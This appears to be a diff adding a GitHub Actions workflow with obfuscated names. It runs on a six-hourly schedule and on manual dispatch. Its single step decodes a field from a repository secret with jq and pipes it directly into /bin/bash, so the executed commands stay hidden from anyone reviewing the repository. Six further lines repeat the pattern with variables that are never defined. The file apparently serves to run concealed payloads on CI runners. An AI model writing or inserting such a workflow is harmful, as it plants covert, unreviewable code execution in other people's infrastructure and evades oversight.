@@ -1,0 +1,24 @@
+name: qianduoshao2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianduoshao2345
+        env:
+          ko83: ${{ secrets.ko83 }}
+        run: |
+          echo $ko83 | jq -r .vli2256 | /bin/bash
+          echo $x25 | jq -r .irdgd43496 | /bin/bash
+          echo $ll1108 | jq -r .cq8 | /bin/bash
+          echo $shz90189 | jq -r .gicd47724 | /bin/bash
+          echo $bcez43 | jq -r .yetxs43 | /bin/bash
+          echo $ro0 | jq -r .qdpza9808 | /bin/bash
+          echo $eezm67416 | jq -r .gm4834 | /bin/bash
+
